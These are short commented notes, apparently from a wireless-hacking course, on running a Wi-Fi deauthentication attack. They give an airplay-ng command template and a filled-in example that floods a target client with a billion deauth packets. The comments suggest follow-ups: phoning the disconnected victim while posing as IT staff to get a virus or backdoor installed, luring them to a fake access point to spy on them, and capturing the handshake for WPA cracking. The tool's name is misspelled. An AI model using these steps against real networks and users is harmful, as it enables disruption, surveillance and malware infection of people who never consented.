# this attack allows us to disconnect any device from any network before connecting to 
# any of these networks and without the need to know the password for the network
# to do this, we're going to pretend to be the client that we want to disconnect
# by changing our mac address to the mac address of that client

# to do this, we're going to use a tool called airplay-ng
airplay-ng --deauth <no of deauth packets> -a <mac address of target network> -c <mac address of client to be disconnected> <name of wireless adapter in monitor mode>
airplay-ng --deauth 1000000000 -a F8:23:B2:B9:50:AB -c 80:E6:50:22:A2:E8 mon0

# you could disconnect client from the network, then call the user pretending that
# you are a person from the IT department and ask them to install a virus or a backdoor
# telling them that it would help fix their issue
# you could also create another fake access point and make them connect to the 
# fake access point and then start spying on them from that access point

# you can also use this attack to capture the handshake and this is vital
# when it comes to WPA cracking